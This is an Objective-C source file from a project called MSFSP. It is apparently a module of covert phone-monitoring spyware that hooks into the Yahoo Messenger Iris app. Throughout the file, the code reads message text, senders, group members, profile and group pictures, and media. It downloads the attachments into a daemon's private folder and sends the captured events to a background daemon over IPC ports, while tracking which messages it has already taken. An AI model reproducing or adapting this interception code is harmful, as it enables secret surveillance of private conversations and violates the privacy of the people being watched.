//
//  YahooMsgIrisUtils.m
//  MSFSP
//
//  Created by Benjawan Tanarattanakorn on 3/25/2557 BE.
//
//

#import <objc/runtime.h>
#import <MobileCoreServices/MobileCoreServices.h>

#import "YahooMsgIrisUtils.h"
#import "IMShareUtils.h"

#import "FxIMEvent.h"
#import "FxEventEnums.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"

#import "YahooAttachmentUtils.h"
#import "YahooMsgEventSender.h"

#import "Item.h"
#import "Item-Actions.h"
#import "ItemMedia.h"
#import "User.h"
#import "Group.h"
#import "Member.h"
#import "IRCollation.h"
#import "IRCollationIterator.h"
#import "Media+Snapchat.h"
#import "Media+Yahoo.h"
#import "IRKey.h"
#import "IRMediaResource.h"
#import "IRRun.h"

#import "StringUtils.h"
#import "DefStd.h"

#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"

#import <pthread.h>

pthread_mutex_t yimMutex = PTHREAD_MUTEX_INITIALIZER;


static YahooMsgIrisUtils *_YahooMsgIrisUtils = nil;

@implementation YahooMsgIrisUtils

#pragma mark Shared Instance

+ (id) sharedYahooUtils {
    if (_YahooMsgIrisUtils == nil) {
        _YahooMsgIrisUtils = [[YahooMsgIrisUtils alloc] init];
        
        [_YahooMsgIrisUtils restoreCaptureUniqueMessageIDs];

        NSArray *searchPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *documentPath = [searchPaths objectAtIndex:0];
        NSString *capturedTimestampFilePath = [NSString stringWithFormat:@"%@/%@", documentPath, @"yh-sts.plist"];
        NSDictionary *capturedTimestampInfo = [NSDictionary dictionaryWithContentsOfFile:capturedTimestampFilePath];
        NSNumber *lastimestamp = [capturedTimestampInfo objectForKey:@"lastTimestamp"];
        if (lastimestamp) {
            [_YahooMsgIrisUtils setMLastMessageTimestamp:[lastimestamp unsignedLongLongValue]];
        } else {
            [_YahooMsgIrisUtils setMLastMessageTimestamp:[[NSDate date] timeIntervalSinceNow]];
        }
        
    }
    return (_YahooMsgIrisUtils);
}

+ (pthread_mutex_t)yahooIRisMutex
{
    return yimMutex;
}


#pragma mark - Util
+ (FxIMEvent *) createFXIMEventForMessageDirection: (FxEventDirection) aDirection
                                    representation: (FxIMMessageRepresentation) aRepresentation
                                           message: (NSString *) aMessage
                                            userID: (NSString *) aUserID
                                   userDisplayName: (NSString *) aUserDisplayname
                                 userStatusMessage: (NSString *) aUserStatusMessage
                                       userPicture: (NSData *) aUserPic
                                          converID: (NSString *) aConverID
                                        converName: (NSString *) aConverName
                                     converPicture: (NSData *) aConverPic
                                      participants: (NSArray *) aParticipaints
                                       attachments: (NSArray *) aAttachments {
    FxIMEvent *imEvent	= [[FxIMEvent alloc] init];
    
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [imEvent setMIMServiceID:@"ymi"];
    [imEvent setMServiceID: kIMServiceYahooMessengerIris];
    
    
    [imEvent setMDirection: aDirection];
    [imEvent setMRepresentationOfMessage: aRepresentation];
    [imEvent setMMessage: aMessage];
    
    // user (sender)
    [imEvent setMUserID: aUserID];
    [imEvent setMUserDisplayName: aUserDisplayname];
    [imEvent setMUserStatusMessage: aUserStatusMessage];
    [imEvent setMUserPicture: aUserPic];// sender image profile
    [imEvent setMUserLocation: nil];
    
    // converstation
    [imEvent setMConversationID:aConverID];
    [imEvent setMConversationName:aConverName];
    [imEvent setMConversationPicture:aConverPic];
    
    // participant
    [imEvent setMParticipants:aParticipaints];
    
    // share location
    [imEvent setMShareLocation:nil];
    
    [imEvent setMAttachments:aAttachments];
    //DLog(@"Yahoo Messenger %@", imEvent);
    
    return [imEvent autorelease];
}

+ (FxRecipient *) createFxRecipientWithUsername: (NSString *) aUserID
                                    displayname: (NSString *) aUserDisplayname
                                  statusMessage: (NSString *) aStatusMessage
                                 pictureProfile: (NSData *) aPictureProfile {
    FxRecipient *participant = [[FxRecipient alloc] init];
    [participant setRecipNumAddr:aUserID];
    [participant setRecipContactName:aUserDisplayname];
    [participant setMStatusMessage:aStatusMessage];
    [participant setMPicture:aPictureProfile];
    return [participant autorelease];
}

#pragma mark - Event Sending IRIS

+ (void) sendTextMessageEventForItemKey: (IRKey *) anItemKey inGroup:(Group *)aGroup {
    @try {
        //DLog(@"Send Yahoo Iris");
        //DLog(@"Group %@", aGroup);
        
        NSMutableDictionary *yahooIrisDictionary = [NSMutableDictionary dictionary];
        
        IRCollation *postedItem = aGroup.postedItems;
        Item *anItem = [postedItem getValueForKey:anItemKey];
        __block FxEventDirection messgageDirection;
        __block FxIMMessageRepresentation messageRepresentation = kIMMessageText;
        
        if (anItem.user.isMe) {
            messgageDirection = kEventDirectionOut;
        }
        else {
            messgageDirection = kEventDirectionIn;
        }
        
        // -- get UID ------------------------------------------------------------
        NSString *targetUID             = [NSString stringWithString:anItem.user.userId];             // -- Target    - UID
        
        // -- get Display Name  ------------------------------------------------------------
        NSString *targetDisplayName     = [NSString stringWithString:anItem.user.fullDisplayName];     // -- Target    - Display Name
        
        // -- get Text ------------------------------------------------------------
        NSString *textMessage           = [NSString stringWithString:anItem.message];                                         // -- Message Text
        //DLog(@"-- Text message:   %@", textMessage);
        
        
        // -- get conversation ID  ------------------------------------------------------------
        NSString *converID              = [NSString stringWithString:aGroup.groupId];       // -- Conversation ID
        NSString *converName             = [NSString stringWithString:aGroup.name];       // -- Conversation ID
        
        
        NSMutableArray *participants    = [NSMutableArray array];
        NSMutableDictionary *participantProfileDictionary    = [NSMutableDictionary dictionary];
        
        IRCollation *groupMember = aGroup.members;
        IRCollationIterator *memberIterator = [groupMember iterator];
        [memberIterator seekToFirst];
        
        //DLog(@"userUID UID %@", anItem.user.userId);
        
        while ([memberIterator isValid]) {
            Member *member = memberIterator.value;
            User *memberUser = member.user;
            
            if (![memberUser.userId isEqualToString:targetUID]) {
                //DLog(@"memberUser UID %@", memberUser.userId);
                Media *profilePicture = memberUser.picture;
                
                if (profilePicture.originalUrl.length > 0) {
                    [participantProfileDictionary setObject:[NSString stringWithString:profilePicture.originalUrl] forKey:[NSString stringWithString:memberUser.userId]];
                }
                
                FxRecipient *participant = [YahooMsgIrisUtils createFxRecipientWithUsername:[NSString stringWithString:memberUser.userId]
                                                                                displayname: [NSString stringWithString:memberUser.fullDisplayName]
                                                                              statusMessage: @""
                                                                             pictureProfile:nil];
                [participants addObject:participant];
            }
            [memberIterator next];
        }
        
        if (participants.count > 0) {
            [yahooIrisDictionary setObject:participantProfileDictionary forKey:@"ParticipantProfileDic"];
        }
        
        //Profile Picture Data
        User *user = anItem.user;
        Media *profilePicture = user.picture;
        if (profilePicture.originalUrl.length > 0) {
            [yahooIrisDictionary setObject:[NSString stringWithString:profilePicture.originalUrl] forKey:@"ProfilePictureURL"];
        }
        
        //Cover Picture Data
        Media *groupPicture = aGroup.picture;
        if (groupPicture.originalUrl.length > 0) {
            //DLog(@"groupPicture URL %@", groupPicture.originalUrl);
            [yahooIrisDictionary setObject:[NSString stringWithString:groupPicture.originalUrl] forKey:@"GroupPictureURL"];
        }
        
        if ([anItem.subtype isEqualToString:@"gif"]) {
            if (anItem.gifResources.count > 0) {
                IRMediaResource *mediaResource = anItem.gifResources[0];
                
                if (mediaResource.url.length > 0) {
                    //DLog(@"Gif URL %@", mediaResource.url);
                    [yahooIrisDictionary setObject:[NSString stringWithString:mediaResource.url] forKey:@"GifURL"];
                }
            }
        }
        
        // ------------------- FXIMEvent Construction ------------------------
        
        if (textMessage.length == 0) {
            messageRepresentation = kIMMessageNone;
        }
        
        if (textMessage.length > 0 && anItem.mediaCount > 0) {
            messageRepresentation = kIMMessageText | kIMMessageNone;
        }
        
        if ([anItem.subtype isEqualToString:@"gif"]) {
            messageRepresentation = kIMMessageNone;
        }
        
        FxIMEvent *imEvent      = [YahooMsgIrisUtils createFXIMEventForMessageDirection: messgageDirection
                                                                         representation: messageRepresentation
                                                                                message: textMessage
                                                                                 userID: targetUID                 // sender id
                                                                        userDisplayName: targetDisplayName         // sender display name
                                                                      userStatusMessage: @""       // sender status message
                                                                            userPicture: nil
                                                                               converID: converID
                                                                             converName: converName
                                                                          converPicture: nil
                                                                           participants: participants
                                                                            attachments: nil];
        
        [YahooMsgIrisUtils saveLastMessageTimestamp:anItem.createdTime];
        [[YahooMsgIrisUtils sharedYahooUtils] storeCapturedMessageUniqueKey:anItem.postedItemKey.base64Data];
        
        //DLog(@"before mediaCount %d", anItem.totalMediaCount);

        if (anItem.totalMediaCount > 0) {
            NSArray *extraArgs  = [[NSArray alloc] initWithObjects:imEvent, anItem, yahooIrisDictionary, [NSNumber numberWithDouble:0], nil];
            [NSThread detachNewThreadSelector:@selector(waitForAttachments:) toTarget:[self class] withObject:extraArgs];
            [extraArgs release];
        }
        else {
            //DLog(@"Yahoo Messenger %@", imEvent);
           // DLog(@"!!! sending IN YAHOO MESSENGER TEXT MESSAGE EVENT");
            [YahooMsgIrisUtils sendYahooEvent:imEvent yahooIrisDic:yahooIrisDictionary];
        }
    }
    @catch (NSException *exception) {
        DLog(@"Yahoo Exception %@", exception);
    }
    @finally {
        ;
    }
}

+ (void)waitForAttachments:(NSArray *)aArgs
{
    @try {
        FxIMEvent *imEvent = [aArgs objectAtIndex:0];
        Item *anItem = [aArgs objectAtIndex:1];
        NSMutableDictionary *yahooIrisDic = [NSMutableDictionary dictionaryWithDictionary:[aArgs objectAtIndex:2]];
        NSNumber *waitingTime = [aArgs objectAtIndex:3];
        
        //DLog(@"Start waiting %f second for attachment", [waitingTime doubleValue]);
        [NSThread sleepForTimeInterval:[waitingTime doubleValue]];
        //DLog(@"Perform capture attachment");
        
        Class $IRRun = objc_getClass("IRRun");
        [$IRRun onDataThread:^{
            NSMutableArray *mediaArray = [NSMutableArray array];
            IRCollation *itemMedias = anItem.media;
            IRCollationIterator *itemMediasIterator = [itemMedias iterator];
            [itemMediasIterator seekToFirst];
            
            while ([itemMediasIterator isValid]) {
                ItemMedia *itemMedia = itemMediasIterator.value;
                //DLog(@"itemMedia %@", itemMedia.sendState);
                Media *media = itemMedia.media;
                
                if (media.originalUrl.length > 0) {
                    [mediaArray addObject:[NSString stringWithString:media.originalUrl]];
                };
                [itemMediasIterator next];
            }
            
            //DLog(@"mediaArray count %d and actual media count %d", mediaArray.count, anItem.totalMediaCount);
            if (mediaArray.count >= anItem.totalMediaCount) {
                [yahooIrisDic setObject:mediaArray forKey:@"MediaArray"];
                [YahooMsgIrisUtils sendYahooEvent:imEvent yahooIrisDic:yahooIrisDic];
            }
            else {
                int remainingMedia = anItem.totalMediaCount - (int)mediaArray.count;
                double newWaitingTime = (double)(remainingMedia * 5);
                NSArray *extraArgs  = [[NSArray alloc] initWithObjects:imEvent, anItem, yahooIrisDic, [NSNumber numberWithDouble:newWaitingTime], nil];
                [NSThread detachNewThreadSelector:@selector(waitForAttachments:) toTarget:[self class] withObject:extraArgs];
                [extraArgs release];
            }
            
            //For prevent crash
            pthread_mutex_lock(&yimMutex);
            [NSThread sleepForTimeInterval:0.01];
            pthread_mutex_unlock(&yimMutex);
        } result:^{
            //DLog(@"Finish");
        } blockUI:NO];

    }
    @catch (NSException *exception) {
        DLog(@"Yahoo Exception %@", exception);
    }
    @finally {
        ;
    }
}

+ (void) sendTextMessageEventForItem: (Item *) anItem {
    //[anItem retain];
    @try {
        //DLog(@"Send Yahoo Iris");
        //DLog(@"anItem %@", anItem);
        
        Group *aGroup = anItem.group;
        NSMutableDictionary *yahooIrisDictionary = [NSMutableDictionary dictionary];
        
        __block FxEventDirection messgageDirection;
        __block FxIMMessageRepresentation messageRepresentation = kIMMessageText;
        
        if (anItem.user.isMe) {
            messgageDirection = kEventDirectionOut;
        }
        else {
            messgageDirection = kEventDirectionIn;
        }
        
        // -- get UID ------------------------------------------------------------
        NSString *targetUID             = [NSString stringWithString:anItem.user.userId];             // -- Target    - UID
        
        // -- get Display Name  ------------------------------------------------------------
        NSString *targetDisplayName     = [NSString stringWithString:anItem.user.fullDisplayName];     // -- Target    - Display Name
        
        // -- get Text ------------------------------------------------------------
        NSString *textMessage           = [NSString stringWithString:anItem.message];                                         // -- Message Text
        DLog(@"-- Text message:   %@", textMessage);
        
        
        // -- get conversation ID  ------------------------------------------------------------
        NSString *converID              = [NSString stringWithString:aGroup.groupId];       // -- Conversation ID
        NSString *converName             = [NSString stringWithString:aGroup.name];       // -- Conversation ID
        
        
        NSMutableArray *participants    = [NSMutableArray array];
        NSMutableDictionary *participantProfileDictionary    = [NSMutableDictionary dictionary];
        
        IRCollation *groupMember = aGroup.members;
        IRCollationIterator *memberIterator = [groupMember iterator];
        [memberIterator seekToFirst];
        
        //DLog(@"userUID UID %@", anItem.user.userId);
        
        while ([memberIterator isValid]) {
            Member *member = memberIterator.value;
            User *memberUser = member.user;
            
            if (![memberUser.userId isEqualToString:targetUID]) {
                DLog(@"memberUser UID %@", memberUser.userId);
                Media *profilePicture = memberUser.picture;
                
                if (profilePicture.originalUrl.length > 0) {
                    [participantProfileDictionary setObject:[NSString stringWithString:profilePicture.originalUrl] forKey:[NSString stringWithString:memberUser.userId]];
                }
                
                FxRecipient *participant = [YahooMsgIrisUtils createFxRecipientWithUsername:[NSString stringWithString:memberUser.userId]
                                                                                displayname: [NSString stringWithString:memberUser.fullDisplayName]
                                                                              statusMessage: @""
                                                                             pictureProfile:nil];
                [participants addObject:participant];
            }
            [memberIterator next];
        }
        
        if (participants.count > 0) {
            [yahooIrisDictionary setObject:participantProfileDictionary forKey:@"ParticipantProfileDic"];
        }
        
        //Profile Picture Data
        User *user = anItem.user;
        Media *profilePicture = user.picture;
        if (profilePicture.originalUrl.length > 0) {
            [yahooIrisDictionary setObject:[NSString stringWithString:profilePicture.originalUrl] forKey:@"ProfilePictureURL"];
        }
        
        //Cover Picture Data
        Media *groupPicture = aGroup.picture;
        if (groupPicture.originalUrl.length > 0) {
            //DLog(@"groupPicture URL %@", groupPicture.originalUrl);
            [yahooIrisDictionary setObject:[NSString stringWithString:groupPicture.originalUrl] forKey:@"GroupPictureURL"];
        }
        
        if ([anItem.subtype isEqualToString:@"gif"]) {
            if (anItem.gifResources.count > 0) {
                IRMediaResource *mediaResource = anItem.gifResources[0];
                
                if (mediaResource.url.length > 0) {
                    //DLog(@"Gif URL %@", mediaResource.url);
                    [yahooIrisDictionary setObject:[NSString stringWithString:mediaResource.url] forKey:@"GifURL"];
                }
            }
        }
        
        // ------------------- FXIMEvent Construction ------------------------
        
        if (textMessage.length == 0) {
            messageRepresentation = kIMMessageNone;
        }
        
        if (textMessage.length > 0 && anItem.mediaCount > 0) {
            messageRepresentation = kIMMessageText | kIMMessageNone;
        }
        
        if ([anItem.subtype isEqualToString:@"gif"]) {
            messageRepresentation = kIMMessageNone;
        }
        
        FxIMEvent *imEvent      = [YahooMsgIrisUtils createFXIMEventForMessageDirection: messgageDirection
                                                                         representation: messageRepresentation
                                                                                message: textMessage
                                                                                 userID: targetUID                 // sender id
                                                                        userDisplayName: targetDisplayName         // sender display name
                                                                      userStatusMessage: @""       // sender status message
                                                                            userPicture: nil
                                                                               converID: converID
                                                                             converName: converName
                                                                          converPicture: nil
                                                                           participants: participants
                                                                            attachments: nil];
        
        [YahooMsgIrisUtils saveLastMessageTimestamp:anItem.createdTime];
        [[YahooMsgIrisUtils sharedYahooUtils] storeCapturedMessageUniqueKey:anItem.postedItemKey.base64Data];
        
        double mediaWaitingTime = (double)anItem.totalMediaCount * 4;
        
        //DLog(@"mediaCount %d", anItem.totalMediaCount);
        
        dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, mediaWaitingTime * NSEC_PER_SEC);
        dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
            NSMutableArray *mediaArray = [NSMutableArray array];
            IRCollation *itemMedias = anItem.media;
            IRCollationIterator *itemMediasIterator = [itemMedias iterator];
            [itemMediasIterator seekToFirst];
            
            while ([itemMediasIterator isValid]) {
                ItemMedia *itemMedia = itemMediasIterator.value;
                //DLog(@"itemMedia %@", itemMedia.sendState);
                Media *media = itemMedia.media;
                
                if (media.originalUrl.length > 0) {
                    [mediaArray addObject:[NSString stringWithString:media.originalUrl]];
                };
                
                [itemMediasIterator next];
            }
            
            //DLog(@"mediaArray count %lu", (unsigned long)mediaArray.count);
            if (mediaArray.count > 0) {
                [yahooIrisDictionary setObject:mediaArray forKey:@"MediaArray"];
            }
            
            //DLog(@"Yahoo Messenger %@", imEvent);
            //DLog(@"!!! sending IN YAHOO MESSENGER TEXT MESSAGE EVENT");
            [YahooMsgIrisUtils sendYahooEvent:imEvent yahooIrisDic:yahooIrisDictionary];
        });
    }
    @catch (NSException *exception) {
        DLog(@"Yahoo Exception %@", exception);
    }
    @finally {
        ;
    }
}

+ (void) sendYahooEvent: (FxIMEvent *) aIMEvent yahooIrisDic:(NSDictionary *)yahooIrisDic;
{
    //DLog(@"Sending Event");
    NSArray *extraArgs  = [[NSArray alloc] initWithObjects:aIMEvent, yahooIrisDic, nil];
    [NSThread detachNewThreadSelector:@selector(threadSendYahooEvent:) toTarget:[self class] withObject:extraArgs];
    
    [extraArgs release];
}

#pragma mark - Send event thread method

+ (void) threadSendYahooEvent: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    @try {
        FxIMEvent *imEvent = [aArgs objectAtIndex:0];
        //DLog(@"Sending Event %@", imEvent);
        NSDictionary *yahooIrisDic = [aArgs objectAtIndex:1];
        
        //Download Profile Picture Data
        NSString *profilePictureURL = yahooIrisDic[@"ProfilePictureURL"];
        if (profilePictureURL.length > 0) {
                NSData *profilePictureData = [NSData dataWithContentsOfURL:[NSURL URLWithString:profilePictureURL]];
                [imEvent setMUserPicture:profilePictureData];
                //DLog(@"Download Profile Picture Data %@", profilePictureURL);
        }
        
        //Download Profile Picture Data
        NSString *groupPictureURL = yahooIrisDic[@"GroupPictureURL"];
        if (groupPictureURL.length > 0) {
            NSData *profilePictureData = [NSData dataWithContentsOfURL:[NSURL URLWithString:groupPictureURL]];
            [imEvent setMConversationPicture:profilePictureData];
            //DLog(@"Download Group Picture Data %@", groupPictureURL);
        }
        
        //Download Participant Profile Picture Data
        NSArray *participantArray = imEvent.mParticipants;
        NSDictionary *profileDic = yahooIrisDic[@"ParticipantProfileDic"];
        [participantArray enumerateObjectsUsingBlock:^(FxRecipient *participant, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
            
        if ([profileDic objectForKey:participant.recipNumAddr]) {
                NSString *profilePictureURL = [profileDic objectForKey:participant.recipNumAddr];
        
                if (profilePictureURL.length > 0) {
                        //DLog(@"Download Participant Profile Picture Data %@", profilePictureURL);
                        NSData *profilePictureData = [NSData dataWithContentsOfURL:[NSURL URLWithString:profilePictureURL]];
                        [participant setMPicture:profilePictureData];
                    }
            }
        }];
        
        NSArray *mediaArray = yahooIrisDic[@"MediaArray"];
        
        if (mediaArray.count > 0) {
            NSMutableArray *attachmentArray = [NSMutableArray array];
            [mediaArray enumerateObjectsUsingBlock:^(NSString *originalUrl, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
                NSString *yimAttachmentPath = nil;
                FxAttachment *attachment = [[FxAttachment alloc] init];
                NSData *mediaData = [NSData dataWithContentsOfURL:[NSURL URLWithString:originalUrl]];
                //DLog(@"Media URL %@", originalUrl);
                if (mediaData) {
                    yimAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imYahooMessenger/"];
                    yimAttachmentPath = [NSString stringWithFormat:@"%@%f_%@", yimAttachmentPath, [[NSDate date] timeIntervalSince1970], originalUrl.lastPathComponent];
                    
                    if (![mediaData writeToFile:yimAttachmentPath atomically:YES]) {
                        // iOS 9, Sandbox
                        yimAttachmentPath = [IMShareUtils saveData:mediaData toDocumentSubDirectory:@"/attachments/imYahooMessenger/" fileName:[yimAttachmentPath lastPathComponent]];
                    }
                } else {
                    yimAttachmentPath = @"image/jpg";
                }
                
                [attachment setFullPath:yimAttachmentPath];
                [attachment setMThumbnail:nil];
                [attachmentArray addObject:attachment];
                [attachment release];
            }];
            
            [imEvent setMAttachments:attachmentArray];
        }
        
        NSString *gifURL = yahooIrisDic[@"GifURL"];
        
        if (gifURL.length > 0) {
            //DLog(@"gifURL = %@", gifURL);
            NSMutableArray *attachmentArray = [NSMutableArray array];
            NSData *attachmentData = [NSData dataWithContentsOfURL:[NSURL URLWithString:gifURL]];
            FxAttachment *attachment = [[FxAttachment alloc] init];
            [attachment setFullPath:@"image/gif"];
            [attachment setMThumbnail:attachmentData];
            [attachmentArray addObject:attachment];
            [attachment release];
            [imEvent setMAttachments:attachmentArray];
        }
  
        //DLog(@"Yahoo Messenger message after remove emoji = %@", [StringUtils removePrivateUnicodeSymbols:[imEvent mMessage]]);
        
        if (imEvent) {
            NSString *msg = [StringUtils removePrivateUnicodeSymbols:[imEvent mMessage]];
            //DLog(@"Yahoo Messenger message after remove emoji = %@", msg);
            
            if ([msg length] || [[imEvent mAttachments] count]) {
                [imEvent setMMessage:msg];
                
                NSMutableData* data			= [[NSMutableData alloc] init];
                NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
                [archiver encodeObject:imEvent forKey:kYahooMsgArchived];
                [archiver finishEncoding];
                [archiver release];
                
                // -- first
                BOOL isSendingOK = [self sendDataToPort:data portName:kYahooMsgMessagePort1];
                //DLog (@"Sending to first port %d", isSendingOK);
                
                if (!isSendingOK) {
                    DLog (@"First sending Yahoo Messenger fail");
                    
                    // -- second
                    isSendingOK = [self sendDataToPort:data portName:kYahooMsgMessagePort2];
                    
                    if (!isSendingOK) {
                        DLog (@"Second sending Yahoo Messenger also fail");
                        
                        // -- Third port ----------
                        [NSThread sleepForTimeInterval:3];
                        
                        isSendingOK = [self sendDataToPort:data portName:kYahooMsgMessagePort3];
                        if (!isSendingOK) {
                            DLog (@"Third sending Yahoo Messenger also fail, so delete the attachment");
                            [YahooMsgIrisUtils deleteAttachmentFileAtPathForEvent:[imEvent mAttachments]];
                        }
                    }
                }
                [data release];
            }
        } // aIMEvent
    }
    @catch (NSException *exception){
        DLog(@"Yahoo Exception %@", exception);
    }
    @finally {
        ;
    }
    [pool release];
}

- (BOOL) canCaptureMessageWithUniqueKey: (NSString *) aKey {
    BOOL __block capture = YES;
    NSArray *array = [NSArray arrayWithArray:self.mCapturedUniqueMessageKeys];
    //DLog(@"aKey, %@", aKey);
    //DLog(@"Unique IDs, %@", array);
    [array enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {
        //DLog(@"obj, %@", obj);
        if ([(NSString *)obj isEqualToString:aKey]) {
            capture = NO;
            *stop = YES;
        }
    }];
    return (capture);
}

- (void) storeCapturedMessageUniqueKey: (NSString *) aKey {
    //DLog(@"aUniqueID, %@", aKey);
    //DLog(@"aUniqueID, %@", [aKey class]);
    if (aKey) {
        [self.mCapturedUniqueMessageKeys insertObject:aKey atIndex:0];
        if ([self.mCapturedUniqueMessageKeys count] > 100) {
            NSArray *tempArray = [self.mCapturedUniqueMessageKeys subarrayWithRange:NSMakeRange(0, 99)];
            
            self.mCapturedUniqueMessageKeys = [NSMutableArray arrayWithArray:tempArray];
        }
        
        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *basePath = paths.firstObject;
        NSString *filePath = [basePath stringByAppendingString:@"/uniqueIDs.plist"];
        [self.mCapturedUniqueMessageKeys writeToFile:filePath atomically:YES];
    }
}

+ (void) saveLastMessageTimestamp: (unsigned long long) aSendTimestamp {
    
    if (aSendTimestamp < [[YahooMsgIrisUtils sharedYahooUtils] mLastMessageTimestamp]) {
        return;
    }
    
    NSArray *searchPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentPath = [searchPaths objectAtIndex:0];
    NSString *capturedTimestampFilePath = [NSString stringWithFormat:@"%@/%@", documentPath, @"yh-sts.plist"];
    NSDictionary *capturedTimestampInfo = [NSDictionary dictionaryWithObject:[NSNumber numberWithUnsignedLongLong:aSendTimestamp] forKey:@"lastTimestamp"];
    [capturedTimestampInfo writeToFile:capturedTimestampFilePath atomically:YES];
}

- (void) restoreCaptureUniqueMessageIDs {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *basePath = paths.firstObject;
    NSString *filePath = [basePath stringByAppendingString:@"/uniqueIDs.plist"];
    NSArray *uniqueIdInfo = [NSArray arrayWithContentsOfFile:filePath];
    if (uniqueIdInfo) {
        self.mCapturedUniqueMessageKeys = [NSMutableArray arrayWithArray:uniqueIdInfo];
    } else {
        self.mCapturedUniqueMessageKeys = [NSMutableArray array];
    }
}

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
    BOOL successfully = FALSE;
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
        MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
        successfully                            = [messagePortSender writeDataToPort:aData];
        [messagePortSender release];
        messagePortSender = nil;
    } else {
        SharedFile2IPCSender *sharedFileSender  = [[YahooMsgEventSender sharedYahooMsgEventSender] mIMSharedFileSender];
        //DLog(@"sharedFileSender %@", sharedFileSender);
        successfully = [sharedFileSender writeDataToSharedFile:aData];
    }
    return (successfully);
}

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray {
    // delete the attachment files
    if (aAttachmentArray && [aAttachmentArray count] != 0) {
        for (FxAttachment *attachment in aAttachmentArray) {
            NSString *path = [attachment fullPath];
            //DLog (@"deleting Yahoo Messenger attachment file: %@", path);
            [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
        }
    }
}


@end
